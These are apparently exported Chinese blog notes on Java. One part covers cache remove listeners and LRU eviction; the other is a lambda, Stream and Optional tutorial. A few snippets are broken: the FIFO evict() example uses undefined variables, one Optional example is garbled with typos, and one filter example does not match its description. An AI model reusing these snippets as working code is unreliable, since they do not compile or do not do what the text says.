CacheRemoveListenerContextCacheRemoveListenerContext该类的实现比较简单，就是给成员变量赋值即可，并且用到了单例模式 public class CacheRemoveListenerContext&lt;K,V&gt; implements ICacheRemoveListenerContext&lt;K,V&gt; &#123; /** * key */ private K key; /** * 值 */ private V value; /** * 删除类型 */ private String type; /** * 新建实例 * @param &lt;K&gt; key * @param &lt;V&gt; value * @since 0.0.6 */ public static &lt;K,V&gt; CacheRemoveListenerContext&lt;K,V&gt; newInstance() &#123; return new CacheRemoveListenerContext&lt;&gt;(); &#125; @Override public K key() &#123; return key; &#125; public CacheRemoveListenerContext&lt;K, V&gt; key(K key) &#123; this.key = key; return this; &#125; @Override public V value() &#123; return value; &#125; public CacheRemoveListenerContext&lt;K, V&gt; value(V value) &#123; this.value = value; return this; &#125; @Override public String type() &#123; return type; &#125; public CacheRemoveListenerContext&lt;K, V&gt; type(String type) &#123; this.type = type; return this; &#125; &#125; CacheRemoveType表示移除类型的枚举类 public enum CacheRemoveType &#123; EXPIRE(&quot;expire&quot;, &quot;过期&quot;), EVICT(&quot;evict&quot;, &quot;淘汰&quot;), ; private final String code; private final String desc; CacheRemoveType(String code, String desc) &#123; this.code = code; this.desc = desc; &#125; public String code() &#123; return code; &#125; public String desc() &#123; return desc; &#125; @Override public String toString() &#123; return &quot;CacheRemoveType&#123;&quot; + &quot;code=&#x27;&quot; + code + &#x27;\\&#x27;&#x27; + &quot;, desc=&#x27;&quot; + desc + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125; &#125; 因为同类型的监听器可能有多种，所以需要创建一个获取该类型监听器的工厂类 CacheRemoveListenerspublic class CacheRemoveListeners &#123; private CacheRemoveListeners()&#123;&#125; /** * 默认监听类 * @return 监听类列表 * @param &lt;K&gt; key * @param &lt;V&gt; value */ @SuppressWarnings(&quot;all&quot;) public static &lt;K,V&gt; List&lt;ICacheRemoveListener&lt;K,V&gt;&gt; defaults() &#123; List&lt;ICacheRemoveListener&lt;K,V&gt;&gt; listeners = new ArrayList&lt;&gt;(); listeners.add(new CacheRemoveListener()); return listeners; &#125; &#125; 所有准备工作都做完后，接下来就是将监听器加入到cache中 在cache和cacheBs中添加成员变量 cache中代码 /** * 删除监听类 */ private List&lt;ICacheRemoveListener&lt;K,V&gt;&gt; removeListeners; @Override public List&lt;ICacheRemoveListener&lt;K, V&gt;&gt; removeListeners() &#123; return removeListeners; &#125; public Cache&lt;K, V&gt; removeListeners(List&lt;ICacheRemoveListener&lt;K, V&gt;&gt; removeListeners) &#123; this.removeListeners = removeListeners; return this; &#125; cacheBs中的代码 /** * 删除监听类 */ private final List&lt;ICacheRemoveListener&lt;K,V&gt;&gt; removeListeners = CacheRemoveListeners.defaults(); // 同时添加对应的构造方法，这样用户可以自定义对应的监听器 public CacheBs&lt;K, V&gt; addRemoveListener(ICacheRemoveListener&lt;K,V&gt; removeListener) &#123; ArgUtil.notNull(removeListener, &quot;removeListener&quot;); this.removeListeners.add(removeListener); return this; &#125; public ICache&lt;K,V&gt; build() &#123; Cache&lt;K,V&gt; cache = new Cache&lt;&gt;(); cache.map(map); cache.evict(evict); cache.sizeLimit(size); cache.removeListeners(removeListeners); // 初始化 cache.init(); return CacheProxy.getProxy(cache); &#125; 执行监听器有两个位置需要执行删除监听器 key过期 key淘汰 key过期首先修改key过期的代码，上述的CacheExpire和CacheExpireSort中是执行过期淘汰的类，其中expireKey()方法执行真正的淘汰的操作，所以就是在这里加入监听器 private void expireKey(final K key, final Long expireAt) &#123; if(expireAt == null) &#123; return; &#125; long currentTime = System.currentTimeMillis(); if(currentTime &gt;= expireAt) &#123; expireMap.remove(key); // 再移除缓存，后续可以通过惰性删除做补偿 V removeValue = cache.remove(key); // 执行淘汰监听器 ICacheRemoveListenerContext&lt;K,V&gt; removeListenerContext = CacheRemoveListenerContext.&lt;K,V&gt;newInstance().key(key).value(removeValue).type(CacheRemoveType.EXPIRE.code()); for(ICacheRemoveListener&lt;K,V&gt; listener : cache.removeListeners()) &#123; listener.listen(removeListenerContext); &#125; &#125; &#125; key淘汰对于第二种情况，也可以采用相同的方法，在CacheEvictFIFO中的evict()方法中执行监听器 @Override public void evict(ICacheEvictContext&lt;K, V&gt; context) &#123; final ICache&lt;K,V&gt; cache = context.cache(); // 超过限制，执行移除 if(cache.size() &gt;= context.size()) &#123; K evictKey = queue.remove(); // 移除最开始的元素 cache.remove(evictKey); // 执行淘汰监听器 ICacheRemoveListenerContext&lt;K,V&gt; removeListenerContext = CacheRemoveListenerContext.&lt;K,V&gt;newInstance().key(key).value(removeValue).type(CacheRemoveType.EVICT.code()); for(ICacheRemoveListener&lt;K,V&gt; listener : cache.removeListeners()) &#123; listener.listen(removeListenerContext); &#125; &#125; // 将新加的元素放入队尾 final K key = context.key(); queue.add(key); &#125; 此外还有一种方法，修改cache中的put()方法，因为在添加元素之前，都会执行一次淘汰操作就是evict()，那么可以将被淘汰的元素作为返回值返回，在put()方法中执行监听器。所以需要创建一个接收淘汰元素的类 public class CacheEntry&lt;K,V&gt; implements ICacheEntry&lt;K,V&gt; &#123; /** * key */ private final K key; /** * value */ private final V value; /** * 新建元素 * @param key key * @param value value * @param &lt;K&gt; 泛型 * @param &lt;V&gt; 泛型 * @return 结果 */ public static &lt;K,V&gt; CacheEntry&lt;K,V&gt; of(final K key, final V value) &#123; return new CacheEntry&lt;&gt;(key, value); &#125; public CacheEntry(K key, V value) &#123; this.key = key; this.value = value; &#125; @Override public K key() &#123; return key; &#125; @Override public V value() &#123; return value; &#125; @Override public String toString() &#123; return &quot;EvictEntry&#123;&quot; + &quot;key=&quot; + key + &quot;, value=&quot; + value + &#x27;&#125;&#x27;; &#125; &#125; 在put()中接收被淘汰的元素信息 public V put(K key, V value) &#123; //1.1 尝试驱除 CacheEvictContext&lt;K,V&gt; context = new CacheEvictContext&lt;&gt;(); context.key(key).size(sizeLimit).cache(this); ICacheEntry&lt;K,V&gt; evictEntry = evict.evict(context); // 添加拦截器调用 if(ObjectUtil.isNotNull(evictEntry)) &#123; // 执行淘汰监听器 ICacheRemoveListenerContext&lt;K,V&gt; removeListenerContext = CacheRemoveListenerContext.&lt;K,V&gt;newInstance().key(evictEntry.key()) .value(evictEntry.value()) .type(CacheRemoveType.EVICT.code()); for(ICacheRemoveListener&lt;K,V&gt; listener : context.cache().removeListeners()) &#123; listener.listen(removeListenerContext); &#125; &#125; //2. 判断驱除后的信息 if(isSizeLimit()) &#123; throw new CacheRuntimeException(&quot;当前队列已满，数据添加失败！&quot;); &#125; //3. 执行添加 return map.put(key, value); &#125; 同样也能实现对删除操作的监听，这样做的好处是，后续添加不同的淘汰策略时，不用在每一种策略中添加执行监听器的代码，减少了代码的冗余。 测试public class MyRemoveListener&lt;K,V&gt; implements ICacheRemoveListener&lt;K,V&gt; &#123; @Override public void listen(ICacheRemoveListenerContext&lt;K, V&gt; context) &#123; System.out.println(&quot;【删除提示】：&quot; + context.key()); &#125; &#125; @Test public void cacheRemoveListenerTest() &#123; ICache&lt;String, String&gt; cache = CacheBs.&lt;String,String&gt;newInstance() .size(1) .addRemoveListener(new MyRemoveListener&lt;String, String&gt;()) // 可以根据需要添加不同的监听器 .build(); cache.put(&quot;1&quot;, &quot;1&quot;); cache.put(&quot;2&quot;, &quot;2&quot;); &#125; [DEBUG] [2023-05-26 11:27:03.186] [main] [c.g.h.c.c.s.i.c.CacheInterceptorCost.before] - Cost start, method: put [DEBUG] [2023-05-26 11:27:03.208] [main] [c.g.h.c.c.s.i.c.CacheInterceptorCost.after] - Cost end, method: put, cost: 34ms [DEBUG] [2023-05-26 11:27:03.208] [main] [c.g.h.c.c.s.i.c.CacheInterceptorCost.before] - Cost start, method: put 0 [DEBUG] [2023-05-26 11:27:03.250] [main] [c.g.h.c.c.s.l.r.CacheRemoveListener.listen] - Remove key: 1, value: 1, type: evict 【删除提示】：1 [DEBUG] [2023-05-26 11:27:03.250] [main] [c.g.h.c.c.s.i.c.CacheInterceptorCost.after] - Cost end, method: put, cost: 42ms LRU 缓存淘汰策略LRU 是由 Least Recently Used 的首字母组成，表示最近最少使用的含义，一般使用在对象淘汰算法上。 也是比较常见的一种淘汰算法。 其核心思想是如果数据最近被访问过，那么将来被访问的几率也更高。 以上的理论是基于连续性准则。 时间连续性 对于信息的访问，最近被访问过，再次被访问的可能性会很高。LRU就是基于这个理念 空间连续性 对于磁盘信息的访问，将很有访问连续的空间信息。所有会有page预取来提升性能 java的实现步骤 新数据插入到链表头部 每当缓存命中（即缓存数据被访问），就将数据移到链表的头部 当链表满的时候，将链表尾部的数据丢弃 思考1.如何判断是新数据？每当缓存命中（即缓存数据被访问），则将数据移到链表头部； 2.什么是缓存命中 put(key, value)的情况，就是新元素。如果已经有这个元素，可以先删除，再加入 get(key)的情况，对于元素的访问，删除已有的元素，将新元素再放到链表的头部 remove(key)移除一个元素，直接删除已有的元素 keySet() valueSet() entrySet() 这些属于无差别访问，我们不对队列做调整。 3.移除当链表满的时候，将链表尾部的数据丢弃。 链表满只有一种场景，那就是添加元素的时候，也就是执行 put(key, value) 的时候。 直接删除对应的 key 即可。 相关接口和FIFO的接口保持一致，调用地方不变 为了后续的LRU/LRU实现，新增remove/update两个方法 public interface ICacheEvict&lt;K, V&gt; &#123; /** * 驱除策略 * * @param context 上下文 * @return 是否执行驱除 */ boolean evict(final ICacheEvictContext&lt;K, V&gt; context); /** * 更新 key 信息 * @param key key */ void update(final K key); /** * 删除 key 信息 * @param key key */ void remove(final K key); &#125; 代码实现CacheEvictLRU直接基于 LinkedList 实现： /** * 丢弃策略-LRU 最近最少使用 * @author binbin.hou * @since 0.0.11 */ public class CacheEvictLRU&lt;K,V&gt; implements ICacheEvict&lt;K,V&gt; &#123; private static final Log log = LogFactory.getLog(CacheEvictLRU.class); /** * list 信息 */ private final List&lt;K&gt; list = new LinkedList&lt;&gt;(); @Override public boolean evict(ICacheEvictContext&lt;K, V&gt; context) &#123; boolean result = false; final ICache&lt;K,V&gt; cache = context.cache(); // 超过限制，移除队尾的元素 if(cache.size() &gt;= context.size()) &#123; K evictKey = list.get(list.size()-1); // 移除对应的元素 cache.remove(evictKey); result = true; &#125; return result; &#125; /** * 放入元素 * （1）删除已经存在的 * （2）新元素放到元素头部 * * @param key 元素 */ @Override public void update(final K key) &#123; this.list.remove(key); this.list.add(0, key); &#125; /** * 移除元素 * @param key 元素 */ @Override public void remove(final K key) &#123; this.list.remove(key); &#125; &#125; 实现的比较简单，相对FiFO多了三个方法 update(): 做了一点简化，认为只要是访问就是删除，然后插入到队首 remove()：删除就是直接从链表中删除 CacheInterceptor方法已经写好，但是什么方法需要调用，如何调用？ 这里还是基于注解的实现 /** * 是否执行驱除更新 * * 主要用于 LRU/LFU 等驱除策略 * @return 是否 */ boolean evict() default false; cache上面思考中，什么是缓存命中，说明了哪些方法需要添加注释 @Override @CacheInterceptor(refresh = true, evict = true) public boolean containsKey(Object key) &#123; return map.containsKey(key); &#125; @Override @CacheInterceptor(evict = true) @SuppressWarnings(&quot;unchecked&quot;) public V get(Object key) &#123; //1. 刷新所有过期信息 K genericKey = (K) key; this.expire.refreshExpire(Collections.singletonList(genericKey)); return map.get(key); &#125; @Override @CacheInterceptor(aof = true, evict = true) public V put(K key, V value) &#123; //... &#125; @Override @CacheInterceptor(aof = true, evict = true) public V remove(Object key) &#123; return map.remove(key); &#125; 注解驱逐拦截器实现执行顺序：放在方法之后更新，不然每次当前操作的 key 都会被放在最前面。 public class CacheInterceptorEvict&lt;K,V&gt; implements ICacheInterceptor&lt;K, V&gt; &#123; private static final Log log = LogFactory.getLog(CacheInterceptorEvict.class); @Override public void before(ICacheInterceptorContext&lt;K,V&gt; context) &#123; &#125; @Override @SuppressWarnings(&quot;all&quot;) public void after(ICacheInterceptorContext&lt;K,V&gt; context) &#123; ICacheEvict&lt;K,V&gt; evict = context.cache().evict(); Method method = context.method(); final K key = (K) context.params()[0]; if(&quot;remove&quot;.equals(method.getName())) &#123; evict.remove(key); &#125; else &#123; evict.update(key); &#125; &#125; &#125;","tags":[]},{"title":"java_stream","date":"2023-05-06T12:14:39.000Z","path":"2023/05/06/java-stream/","text":"1.lambda表达式1.1 概述Lambda是JDK8的语法糖。可以对某些匿名内部类的写法进行简化。是函数式编程的重要体现，不用关心是什么对象，而是更加关注对数据进行什么操作 1.2 核心原则 可推导可省略 1.3 基本格式(参数列表) -&gt; &#123;代码&#125; 例子 针对只有一个抽象方法的匿名内部类 new Thread(new Runnable() &#123; @Override public void run() &#123; System.out.println(&quot;hello world!&quot;); &#125; &#125;).start(); new Thread(() -&gt; System.out.println(&quot;hello world!&quot;)).start(); public static int calculate(IntBinaryOperator operator)&#123; int a = 10; int b = 20; return operator.applyAsInt(a, b); &#125; int calculate = calculate(new IntBinaryOperator() &#123; @Override public int applyAsInt(int left, int right) &#123; return left + right; &#125; &#125;); int calculate = calculate((a, b) -&gt; a + b); int calculate = calculate(Integer::sum); public static void intPrint(IntPredicate intPredicate)&#123; int[] arr = &#123;1, 2, 3, 4, 5, 6&#125;; for (int i : arr) &#123; if(intPredicate.test(i))&#123; System.out.println(i); &#125; &#125; &#125; intPrint(new IntPredicate() &#123; @Override public boolean test(int value) &#123; return value % 2 == 0; &#125; &#125;); intPrint( (value -&gt; &#123; return value % 2 == 0; &#125;)); public static &lt;R&gt; R typeCover(Function&lt;String, R&gt; function)&#123; String str = &quot;12345&quot;; R result = function.apply(str); return result; &#125; Integer integer = typeCover(new Function&lt;String, Integer&gt;() &#123; @Override public Integer apply(String s) &#123; return Integer.valueOf(s); &#125; &#125;); Integer integer1 = typeCover((s) -&gt; &#123; return Integer.valueOf(s); &#125;); System.out.println(integer); public static void foreachArr(IntConsumer intConsumer)&#123; int[] arr = &#123;1, 2, 3, 4, 5, 6&#125;; for (int i : arr) &#123; intConsumer.accept(i); &#125; &#125; foreachArr(new IntConsumer() &#123; @Override public void accept(int value) &#123; System.out.println(value + 2); &#125; &#125;); foreachArr((value -&gt; &#123; System.out.println(value + 2); &#125;)); foreachArr(System.out::println); 1.4 省略规则 参数类型可以省略 方法体只有一句代码时大括号return和唯一一句代码的分号可以省略 方法只有一个参数时小括号可以省略 以上这些规则都记不住也可以省略不记 2.stream2.1 概述Java8的Stream使用的是函数式编程模式，如同它的名字一样，它可以被用来对集合或数组进行链状流式的操作。可以更方便的让我们对集合或数组操作。 2.2 数据准备 @Data @AllArgsConstructor @NoArgsConstructor @EqualsAndHashCode public class Author &#123; private Long id; private String name; private String introduction; private Integer age; private List&lt;Book&gt; bookList; &#125; @Data @AllArgsConstructor @NoArgsConstructor @EqualsAndHashCode public class Book &#123; private Long id; private String category; private String name; private Double score; private String introduction; &#125; // 初始化一些数据 private static List&lt;Author&gt; getAuthors() &#123; Author author1 = new Author(1L, &quot;杨杰炜&quot;, &quot;my introduction 1&quot;, 18, null); Author author2 = new Author(2L, &quot;yjw&quot;, &quot;my introduction 2&quot;, 19, null); Author author3 = new Author(3L, &quot;yjw&quot;, &quot;my introduction 3&quot;, 14, null); Author author4 = new Author(4L, &quot;wdt&quot;, &quot;my introduction 4&quot;, 29, null); Author author5 = new Author(5L, &quot;wtf&quot;, &quot;my introduction 5&quot;, 12, null); List&lt;Book&gt; books1 = new ArrayList&lt;&gt;(); List&lt;Book&gt; books2 = new ArrayList&lt;&gt;(); List&lt;Book&gt; books3 = new ArrayList&lt;&gt;(); // 上面是作者和书 books1.add(new Book(1L, &quot;类别,分类啊&quot;, &quot;书名1&quot;, 45D, &quot;这是简介哦&quot;)); books1.add(new Book(2L, &quot;高效&quot;, &quot;书名2&quot;, 84D, &quot;这是简介哦&quot;)); books1.add(new Book(3L, &quot;喜剧&quot;, &quot;书名3&quot;, 83D, &quot;这是简介哦&quot;)); books2.add(new Book(5L, &quot;天啊&quot;, &quot;书名4&quot;, 65D, &quot;这是简介哦&quot;)); books2.add(new Book(6L, &quot;高效&quot;, &quot;书名5&quot;, 89D, &quot;这是简介哦&quot;)); books3.add(new Book(7L, &quot;久啊&quot;, &quot;书名6&quot;, 45D, &quot;这是简介哦&quot;)); books3.add(new Book(8L, &quot;高效&quot;, &quot;书名7&quot;, 44D, &quot;这是简介哦&quot;)); books3.add(new Book(9L, &quot;喜剧&quot;, &quot;书名8&quot;, 81D, &quot;这是简介哦&quot;)); author1.setBookList(books1); author2.setBookList(books2); author3.setBookList(books3); author4.setBookList(books3); author5.setBookList(books2); return new ArrayList&lt;&gt;(Arrays.asList(author1, author2, author3, author4, author5)); &#125; 2.3 快速入门2.3.1 需求我们可以调用getAuthors方法获取到作家的集合。现在需要打印所有年龄小于18的作家的名字，并且要注意去重。 2.3.2 实现/** * 我们可以调用getAuthors方法获取到作家的集合。现在需要打印所有年龄小于18的作家的名字，并且要注意去重。 */ public static void test1()&#123; List&lt;Author&gt; authors = getAuthors(); authors.stream().distinct() //去重 .filter(author -&gt; author.getAge() &lt; 18) .forEach(author -&gt; System.out.println(author.getName())); &#125; 2.4 常用操作2.4.1 创建流单列集合:集合对象.stream() List&lt;Author&gt; authors = getAuthors(); Stream&lt;Author&gt; stream = authors.stream(); 数组: Arrays.stream(数据)或者使用Stream.of创建 Integer[] arr = &#123;1, 2, 3&#125;; Stream&lt;Integer&gt; stream = Arrays.stream(arr); Stream&lt;Integer&gt; arr1 = Stream.of(arr); 双列集合:转换为单列集合后创建 HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;(); map.put(&quot;111&quot;, &quot;111&quot;); map.put(&quot;222&quot;, &quot;222&quot;); Stream&lt;Map.Entry&lt;String, String&gt;&gt; stream1 = map.entrySet().stream(); 2.4.2 中间操作filter可以对流中的元素进行条件过滤，符合条件的才能继续留在流中。 例子： 打印所有姓名长度大于2的作家姓名 authors.stream().distinct() //去重 .filter(author -&gt; author.getAge() &lt; 18) .forEach(author -&gt; System.out.println(author.getName())); map对元素进行计算或转换 打印所有作家的姓名 List&lt;Author&gt; authors = getAuthors(); Stream&lt;Author&gt; stream = authors.stream(); stream.map(new Function&lt;Author, String&gt;() &#123; @Override public String apply(Author author) &#123; return author.getName(); &#125; &#125;).forEach(name -&gt; System.out.println(name)); authors.stream() .map(author -&gt; author.getName()) .forEach(name -&gt; System.out.println(name)); authors.stream() .map(Author::getName) .forEach(System.out::println); dictinct对流中的元素进行去重操作 注意: distinct方法是依赖Object的equals方法来判断是否是相同对象的。所以需要注意重新equals方法。 例子 打印所有作家的姓名，不能包含重复的元素 List&lt;Author&gt; authors = getAuthors(); authors.stream() .distinct() .forEach(author -&gt; System.out.println(author.getName()) sorted对流中的元素按照规则进行排序 注意：如果调用空参sorted()方法，需要流中的元素实现了Comparable接口 例子 按照年龄排序，并且不能有重复的元素 升序排序 authors.stream() .distinct() .sorted(new Comparator&lt;Author&gt;() &#123; @Override public int compare(Author o1, Author o2) &#123; return o1.getAge() - o2.getAge(); &#125; &#125;) .forEach(author -&gt; System.out.println(author.getAge())); authors.stream() .distinct() .sorted((o1, o2) -&gt; o1.getAge() - o2.getAge()) .forEach(author -&gt; System.out.println(author.getAge())); authors.stream() .distinct() .sorted(Comparator.comparingInt(Author::getAge)) // 默认是升序排序 .forEach(author -&gt; System.out.println(author.getAge())); 降序排序 authors.stream() .distinct() .sorted((o1, o2) -&gt; o2.getAge() - o1.getAge()) .forEach(author -&gt; System.out.println(author.getAge())); limit可以限制流的最大长度，超出部分将被抛弃 例如:对流中的元素按照年龄进行降序排序，并且要求不能有重复的元素,然后打印其中年龄最大的两个作家的姓名。 List&lt;Author&gt; authors = getAuthors(); authors.stream() .distinct() .sorted((o1, o2) -&gt; o2.getAge() - o1.getAge()) .limit(2) .forEach(author -&gt; System.out.println(author.getName())); skip跳过流中的前n个元素，处理剩下的元素 例子 打印除了年龄最大的作家外的其他作家，要求不能有重复元素，并且按照年龄降序排序 List&lt;Author&gt; authors = getAuthors(); authors.stream() .distinct() .sorted((o1, o2) -&gt; o2.getAge() - o1.getAge()) .skip(1) .forEach(System.out::println); flatMapmap只能将一个对象转换成另一个对象来作为流中的元素，而flatMap可以把一个对象转换成多个对象作为流中的元素 例一 打印所有书籍名字，要求对重复的元素进行去重 authors.stream() .distinct() .flatMap(new Function&lt;Author, Stream&lt;Book&gt;&gt;() &#123; @Override public Stream&lt;Book&gt; apply(Author author) &#123; return author.getBookList().stream(); &#125; &#125;) .distinct() .forEach(new Consumer&lt;Book&gt;() &#123; @Override public void accept(Book book) &#123; System.out.println(book.getName()); &#125; &#125;); authors.stream() .distinct() .flatMap(author -&gt; author.getBookList().stream()) .distinct() .forEach(book -&gt; System.out.println(book.getName())); 例二:打印现有数据的所有分类。要求对分类进行去重。不能出现这种格式:哲学,爱情 authors.stream() .distinct() .flatMap(author -&gt; author.getBookList().stream()) .distinct() .flatMap(book -&gt; Arrays.stream(book.getCategory().split(&quot;,&quot;))) .distinct() .forEach(System.out::println); 2.4.3 终结操作forEach对流中的元素进行遍历操作，我们通过传入的参数去指定对追历到的元素进行什么具体操作。 上面的例子中一直在使用，就不在赘述 count获取当前流中元素的个数 例子 打印这些作家所处书籍的数量，删除重复元素 long count = authors.stream() .distinct() .flatMap(author -&gt; author.getBookList().stream()) .distinct() .count(); System.out.println(count); max&amp;min计算流中元素的最值 例子 分别获取作家所出书籍的最高分和最低分并打印 Optional&lt;Double&gt; max = authors.stream() .distinct() .flatMap(author -&gt; author.getBookList().stream()) .distinct() .map(book -&gt; book.getScore()) .max(new Comparator&lt;Double&gt;() &#123; @Override public int compare(Double o1, Double o2) &#123; if (o1 - o2 &gt; 0) &#123; return 1; &#125; else if (o1 &lt; o2) &#123; return -1; &#125; else &#123; return 0; &#125; &#125; &#125;); Optional&lt;Double&gt; min = authors.stream() .distinct() .flatMap(author -&gt; author.getBookList().stream()) .distinct() .map(book -&gt; book.getScore()) .min((o1, o2) -&gt; &#123; if (o1 - o2 &gt; 0) &#123; return 1; &#125; else if (o1 &lt; o2) &#123; return -1; &#125; else &#123; return 0; &#125; &#125;); System.out.println(max.get()); System.out.println(min.get()); collect把当前流转换成集合 例子 获取一个存放作者名字的集合 List&lt;Author&gt; authors = getAuthors(); List&lt;String&gt; nameList = authors.stream() .distinct() .map(Author::getName) .collect(Collectors.toList()); System.out.println(nameList); 获取所有书名的Set集合 Set&lt;String&gt; nameList = authors.stream() .distinct() .flatMap((Function&lt;Author, Stream&lt;Book&gt;&gt;) author -&gt; author.getBookList().stream()) .map(Book::getName) .collect(Collectors.toSet()); System.out.println(nameList); 获取一个Map集合，key为作者名，value为List&lt;Book&gt; Map&lt;String, List&lt;Book&gt;&gt; map = authors.stream() .distinct() .collect(Collectors.toMap(new Function&lt;Author, String&gt;() &#123; @Override public String apply(Author author) &#123; return author.getName(); &#125; &#125;, new Function&lt;Author, List&lt;Book&gt;&gt;() &#123; @Override public List&lt;Book&gt; apply(Author author) &#123; return author.getBookList(); &#125; &#125;)); map.forEach((key, value) -&gt; System.out.println(key + &quot;:&quot; + value)); Map&lt;String, List&lt;Book&gt;&gt; map = authors.stream() .distinct() .collect(Collectors.toMap(Author::getName, Author::getBookList)); map.forEach((key, value) -&gt; System.out.println(key + &quot;:&quot; + value)); 查找与匹配anyMatch可以用来判断是否有任意匹配符合匹配条件按的元素，返回结果是Boolean类型 例子判断是否有年龄在29岁以上的作家 boolean anyMatch = authors.stream().distinct() .anyMatch(author -&gt; author.getAge() &gt; 30); allMatch可以用来判断是否都符合匹配条件，结果为boolean类型。如果都符合结果为true，否则结果为false。 boolean allMatch = authors.stream().distinct() .allMatch(author -&gt; author.getAge() &gt; 10); noneMatch可以判断流中元素是否都不符合匹配条件，如果都不符合返回true,否则返回false boolean noneMatch = authors.stream().distinct() .noneMatch(author -&gt; author.getAge() &gt; 100); findAny获取流中任意一个元素，该方法没有办法保证获取的一定是流中的第一个元素 例子 获取任意一个大于18的作家，如果存在就输出他的名字 Optional&lt;Author&gt; authorOptional = authors.stream().distinct() .filter(author -&gt; author.getAge() &gt; 18) .findAny(); authorOptional.ifPresent(author -&gt; System.out.println(author.getName())); findFirst获取流中任意一个元素，该方法保证获取的一定是流中的第一个元素 例子 获取年龄最小的作家，如果存在就输出他的名字 Optional&lt;Author&gt; authorOptional = authors.stream().distinct() .sorted((o1, o2) -&gt; o1.getAge() - o2.getAge()) .findFirst(); authorOptional.ifPresent(author -&gt; System.out.println(author.getName())); reduce归并对流中的教据按照你指定的计算方式计算出一个结果。（缩减操作） reduce的作用是把stream中的元素给组合起来，我们可以传入一个初始值，它会按照我们的计算方式依次拿流中的元素和在初始化值的基础上进行计算，计算结果再和后面的元素计算。 例子 使用reduce操作求出所有作家的年龄的和 Integer sum = authors.stream() .map(Author::getAge) .reduce(0, (result, element) -&gt; result + element); System.out.println(sum); 使用reduce求所有作者中年龄的最大值 Integer max = authors.stream() .map(Author::getAge) .reduce(Integer.MIN_VALUE, new BinaryOperator&lt;Integer&gt;() &#123; @Override public Integer apply(Integer result, Integer element) &#123; return result &gt; element ? result : element; &#125; &#125;); 使用reduce求所有作者中年龄的最小值 Integer min = authors.stream() .map(Author::getAge) .reduce(Integer.MAX_VALUE, new BinaryOperator&lt;Integer&gt;() &#123; @Override public Integer apply(Integer result, Integer element) &#123; return result &lt; element ? result : element; &#125; &#125;); reduce一个参数的重载形式内部计算 2.5 注意事项 惰性求值(如果没有终结操作，没有中间提作是不会得到执行的) 流是一次性的 (一旦一个流对象经过一个终结操作后这个流就不能再被使用) 不会影响原数据(我们在流中可以多数据做很多处理。但是正常情况下是不会影响原来集合中的元素的。这往往也是我们期望的) 3. Optional3.1 概述我们在编写代码的时候出现最多的就是空指针异常。所以在很多情况下我们需要做各种非空的判断。 尤其是对象中的属性还是一个对象的情况下。这种判断会更多。而过多的判断语句会让我们的代码显得臃肿不堪。所以在IDK8中引入了Optional,养成使用Optional的习惯后你可以写出更优雅的代码来避免空指针异常并且在很多函数式编程相关的AP中也都用到了Optional，如果不会使用Optional也会对函数式编程的学习造成影响。 3.2 使用3.2.1 创建对象Optional就像是包装类，可以将我们的具体数据封装到Optional内部。然后使用optional获取数据可以非常优雅的避免空指针异常。 一般使用Optional的静态方法ofNullable把数据封装成一个Optional对象。无论传入的参数是否为null都不会出现问题 List&lt;Author&gt; authors = getAuthors(); Optional&lt;List&lt;Author&gt;&gt; optionalAuthors = Optional.ofNullable(authors); 你可能会觉得还要加一行代码来封装数据比较麻烦。但是如果改造下getAuthor方法，让其的返回值就是封装好的Optional的话，我们在使用时就会方便很多。而且在实际开发中我们的数据很多是从数据库获取的。Mybatis从3.5版本可以也已经支持ptional了。我们可以直接把dao方法的返回值类型定义成Optional类型，MyBastis会自己把数据封装成Optional对象返回。封装的过程也不需要我们自己操作。 如果你确定一个对象不是空的则可以使用Optional的静态方法of来把数据封装成Optional对象。 Optional&lt;List&lt;Author&gt;&gt; optionalAuthors = Optional.of(authors); 如果一个方法的返回值是Optional类型，而如果经过我们判断后，发现返回值为null,这时候需要将null封装成Optional对象返回。需要调用Optional的静态方法empty()进行封装 Optional.empty() 3.2.2 安全消费数据我们获取到一个Optional对象后肯定需要对其中的数据进行使用。这时候我们可以使用其ifPresent方法对来消费其中的值.这个方法会判断其内封装的数据是否为空，不为空时才会执行具体的消费代码。这样使用起来就更加安全了。例如,以下写法就优雅的避免了空指针异常。 Optional&lt;List&lt;Author&gt;&gt; optionalAuthors = Optional.of(authors); optionalAuthors.ifPresent(authors1 -&gt; System.out.println(authors1.size())); 3.2.3 获取值直接使用get()函数即可获取被封装的数据，但是当存入的数据是null时，会出现异常 3.2.4 安全地获取值如果我们期望安全的获取值。我们不推荐使用get方法，而是使用Optional提供的以下方法。 orElseGet获取数据并且设置数据为空时的默认值。如果数据不为空就能获取到该数据。如果为空则根据你传入的参数来创建对象作为默认值返回。 Optional&lt;Author&gt; authoroptional = optional.ofNullable(getAuthor()); authoroptional.filter(author -&gt; author,getAge()&gt;100)ifpresent(author -&gt;system.out.print1n(author .getName())); orElseThrow获取数据，如果数据不为空就能获取到该数据。如果为空则根据你传入的参数来创建异常抛出。 3.2.5 过滤我们可以使用filter方法对数据进行过滤。如果原本是有数据的，但是不符合判断，也会变成一个无数据的Optional对象。 3.2.6 判断我们可以使用isPresent方法进行是否存在数据的判断。如果为空返回值为false,如果不为空，返回值为true。但是这种方式并不能体现Optional的好处，更推荐使用ifPresent方法。 3.2.7 数据转换Optional还提供了map可以让我们的对数据进行转换，并且转换得到的数据也还是被Optional包装好的，保证了我们的使用安全。例如我们想获取作家的书籍集合。 4.函数式接口的常用方法and在使用predicate接口时，可能需要进行条件的拼接。and方法就相当于&amp;&amp;符号实现拼接两个判断条件 例如 打印作家中年龄大于17并且姓名长度大于2的作家 List&lt;Author&gt; authors = getAuthors(); authors.stream().filter(new Predicate&lt;Author&gt;() &#123; @Override public boolean test(Author author) &#123; return author.getAge() &gt; 17; &#125; &#125;.and(new Predicate&lt;Author&gt;() &#123; @Override public boolean test(Author author) &#123; return author.getName().length() &gt; 2; &#125; &#125;)).forEach(System.out::println); authors.stream().filter(((Predicate&lt;Author&gt;) author -&gt; author.getAge() &gt; 17).and(author -&gt; author.getName().length() &gt; 2)).forEach(System.out::println); or而or方法相当于是使用||来拼接两个判断条件。 例子 打印作家中年龄大于17或者姓名长度大于2的作家 authors.stream().filter(((Predicate&lt;Author&gt;) author -&gt; author.getAge() &gt; 17).or(author -&gt; author.getName().length() &gt; 2)).forEach(System.out::println); negat就是取反操作，相当于! 